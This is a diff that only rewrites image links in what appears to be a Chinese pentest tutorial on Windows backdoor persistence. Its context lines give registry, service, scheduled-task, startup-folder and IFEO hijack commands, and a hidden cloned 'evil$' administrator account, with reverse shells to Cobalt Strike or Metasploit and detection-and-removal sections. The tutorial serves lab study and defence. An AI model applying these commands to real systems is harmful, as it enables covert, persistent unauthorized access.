@@ -30,7 +30,7 @@ From zero to one
 
  **只供对已授权的目标使用测试，对未授权目标的测试作者不承担责任，均由使用本人自行承担。**
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220531.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220531.png)
 
 文章正文
 
@@ -61,7 +61,7 @@ Userinit 键默认的值为`C:\Windows\system32\userinit.exe,`，我们用下面
     
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,C:\Users\admin\Documents\backdoor.exe"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220539.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220539.png)
 
 当用户重新登录时，便会运行我们的后门程序
 
@@ -89,7 +89,7 @@ userinit 优先于很多杀软启动，通过调用 powershell（例如 web_deli
 
 当用户重新登录时，便会运行我们的后门程序
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220540.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220540.png)
 
 ## 1.4 检测及清除
 
@@ -123,15 +123,15 @@ userinit 优先于很多杀软启动，通过调用 powershell（例如 web_deli
     
     sc create backdoor binpath= C:\Users\admin\Documents\backdoor.exe type= own start= auto displayname= backdoor
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220542.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220542.png)
 
 查看服务，已经创建成功了
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220544.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220544.png)
 
 重启系统以后，虽然 cs 收到了反弹 shell，但是 shell 后面就断线了，在系统中查看服务也是处于停止状态，尝试手动启动服务还会报错
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220545.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220545.png)
 
 这是因为我们的后门程序不符合服务的规范，所以启动失败了，这就需要使用 instsrv + srvany 来创建服务了
 
@@ -143,7 +143,7 @@ instsrv.exe.exe 和 srvany.exe 是 Microsoft Windows Resource Kits 工具集中
 中先切换到`C:\WINDOWS\SysWOW64`目录，再运行命令`instsrv MyService
 C:\WINDOWS\SysWOW64\srvany.exe`
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220546.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220546.png)
 
 再通过以下命令添加注册表
 
@@ -156,11 +156,11 @@ C:\WINDOWS\SysWOW64\srvany.exe`
     # 后门程序  
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\backdoor\Parameters" /v Application /t REG_SZ /d "C:\Users\admin\Documents\backdoor.exe" /f
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220547.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220547.png)
 
 当目标服务器启动的时候，就能收到反弹 shell 了，并且还是 system 权限
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220548.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220548.png)
 
 ### 2.3.2 MSF
 
@@ -175,9 +175,9 @@ C:\WINDOWS\SysWOW64\srvany.exe`
 
 执行完以后便会在目标系统中生成一个自启动服务
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220549.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220549.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220550.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220550.png)
 
 MSF 建立监听，目标服务器启动时便可收到 shell
 
@@ -191,7 +191,7 @@ MSF 建立监听，目标服务器用户重新登录时便可收到 shell
     set lhost 192.168.26.129  
     run
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220551.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220551.png)
 
 ## 2.4 检测及清除
 
@@ -226,11 +226,11 @@ at 适用于windows 2000、2003、xp，schtasks适用于windows >= 2003
     # 每天的16:34启动后门程序  
     at 16:34 /every:M,T,W,Th,F,S,Su C:\ZhiArchive\backdoor.exe
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220552.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220552.png)
 
 成功上线 cs
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220553.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220553.png)
 
 ## 3.3 schtasks
 
@@ -246,7 +246,7 @@ at 适用于windows 2000、2003、xp，schtasks适用于windows >= 2003
     
     schtasks /Create /TN badcode /SC DAILY /ST 16:49 /TR "C:\Users\admin\Documents\backdoor.exe"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220554.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220554.png)
 
 成功上线 cs
 
@@ -258,17 +258,17 @@ at 适用于windows 2000、2003、xp，schtasks适用于windows >= 2003
 
 在`C:\WINDOWS\Tasks`目录排查可疑的定时任务文件
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220555.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220555.png)
 
 在日志`C:\WINDOWS\Tasks\SchedLgU.txt`中排查可疑的定时任务记录
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220556.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220556.png)
 
 #### 3.2.3.2 Windows 7
 
 在任务计划程序中排查可疑的定时任务
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220557.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220557.png)
 
 也可以使用 autoruns 来排查计划任务
 
@@ -314,11 +314,11 @@ at 适用于windows 2000、2003、xp，schtasks适用于windows >= 2003
 
 将后门程序放到上面的用户目录中，目标用户重新登录时便会启动后门程序。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220558.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220558.png)
 
 成功上线 cs
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220559.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220559.png)
 
 ### 4.3.2 注册表启动项
 
@@ -338,13 +338,13 @@ RunOnce 注册键：用户登录时，所有程序按顺序自动执行，在 Ru
     # 添加注册表  
     REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\Users\admin\Documents\backdoor.exe"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220600.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220600.png)
 
 用户重新登录时，便会启动后门程序
 
 成功上线 cs
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220601.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220601.png)
 
 ##### 4.3.2.2 MSF
 
@@ -362,7 +362,7 @@ RunOnce 注册键：用户登录时，所有程序按顺序自动执行，在 Ru
 
 执行以后便会在`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`下生成启动项
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220602.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220602.png)
 
 MSF 建立监听，目标服务器用户重新登录时便可收到 shell
 
@@ -373,7 +373,7 @@ MSF 建立监听，目标服务器用户重新登录时便可收到 shell
     set lhost 192.168.26.129  
     run
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220603.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220603.png)
 
 ## 4.4 检测及清除
 
@@ -417,38 +417,38 @@ Menu\Programs\Startup`目录下排查可疑启动项
     net user evil$ Abcd1234 /add  
     net localgroup administrators evil$ /add
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220604.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220604.png)
 
 在用户名后面加了 $ 之后，使用`net user`命令就无法看到此隐藏用户
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220605.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220605.png)
 
 但是在控制面板和登录界面都是可以看到的
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220606.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220606.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220606.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220606.png)
 
 所以，我们还需要在注册表中进行一些操作，需要更改的注册表键值为`HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users`，默认情况下，`HEKY_LOCAL_MACHINE\SAM\SAM`的内容只有`system`用户才能查看和修改，所以，我们要赋予当前用户完全控制的权限
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220608.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220608.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220609.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220609.png)
 
 我们需要选择一个克隆对象（这里有个坑，见踩坑记录5.1），然后获取它的 F 值，如图所示，我们需要将`000003E8`导出，导出文件暂且命名为 1.reg
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220610.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220610.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220611.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220611.png)
 
 以同样的操作，导出 evil$ 用户和它的 F 值，`000003F4`暂且命名为 2.reg，`evil$`暂且命名为
 3.reg，导出完成以后使用命令`net user evil$ /del`删除 evil$ 用户
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220612.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220612.png)
 
 然后将 2.reg 的 F 值替换为 1.reg 的F值，即将 evil$ 用户的 F 值替换为 admin 用户的 F 值
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220613.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220613.png)
 
 替换完成以后，可以用下面的命令导入注册表
 
@@ -459,22 +459,22 @@ Menu\Programs\Startup`目录下排查可疑启动项
 
 查看效果，现在使用`net user`命令和控制面板均看不到 evil$ 用户
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220614.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220614.png)
 
 登录界面同样也没有
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220615.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220615.png)
 
 远程登录，查看我们的身份，就是克隆对象的身份
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220616.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220616.png)
 
 ## 5.4 检测及清除
 
 查看注册表`HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`中是否有多余的用户，将 Names
 中的用户以及它对应的类型删除即可
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220612.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220612.png)
 
 ## 5.5 踩坑记录
 
@@ -483,7 +483,7 @@ Menu\Programs\Startup`目录下排查可疑启动项
 选择克隆对象时，一定要注意选择的账户是否被禁用，是否支持远程登录，我的实验环境没有启用 administrator 账户，一开始我克隆的是
 administrator，远程登录的时候便报了下面的错
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220618.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220618.png)
 
 ## 5.6 参考
 
@@ -527,11 +527,11 @@ File Execution Options`
     reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /f  
     reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t REG_SZ /d "C:\Users\admin\Documents\backdoor.exe" /f
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220619.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220619.png)
 
 打开计算器的时候成功上线 cs
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220620.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220620.png)
 
 ### 6.3.2 修改 GlobalFlag 值
 
@@ -543,11 +543,11 @@ File Execution Options`
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\calc.exe" /v ReportingMode /t REG_DWORD /d 1  
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\calc.exe" /v MonitorProcess /d "C:\Users\admin\Documents\backdoor.exe"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220621.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220621.png)
 
 先打开计算器，在关闭计算器时，成功上线 cs
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220622.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220622.png)
 
 ### 6.3.3 比较
 
@@ -600,18 +600,18 @@ File Execution Options`中进行排查
     [分享 | 个人渗透技巧汇总（避坑）笔记](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485185&idx=1&sn=a839927c1623655300d93d861bf6e1ad&chksm=fcdf5b1ecba8d2083c582706465f6c5c50e36dcba98853b270350d70c0bc4aa057170fda4d31&scene=21#wechat_redirect)  
     
     
-    ![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220623.png)
+    ![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220623.png)
     
     关注我
     
     获得更多精彩
     
-    ![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220624.png)
+    ![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220624.png)
     
       
     
     
-     **坚持学习与分享！走过路过点个"** _ **在看**_ **"，不会错过**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220625.png)
+     **坚持学习与分享！走过路过点个"** _ **在看**_ **"，不会错过**![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20220929220625.png)
     
      ** _仅用于学习交流，不得用于非法用途_**
     
